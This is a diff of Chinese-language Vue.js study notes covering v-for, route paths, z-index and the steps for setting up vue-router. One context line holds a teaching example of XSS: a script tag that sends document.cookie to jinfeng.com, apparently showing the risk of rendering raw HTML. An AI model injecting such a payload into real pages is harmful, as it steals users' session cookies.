@@ -427,3 +427,26 @@ this.fonSize = 20;
 myhtml = '<h4></h4><img src="jingjing.png"/>点我有惊喜<script> location.href="jinfeng.com?cookie="+document.cookie</script>'
 
 * v-for
+
+* 路由
+    * /goods 
+    * /goods/123
+
+## day4-3
+* 设置z-index很高的数组值，（html）
+    * <div>
+        <img style="position:absolute;">
+    </div>
+
+    <div></div>
+
+* 路由Vue-Router
+    * SPA
+    * hash路由的原理（hashchange事件）
+    * 使用vue-router
+        1. 引入
+        2. 使用插件 Vue.use(插件)
+        3. 实例化路由
+            * 配置参数
+                * routes
+        4. 注入Vue根实例
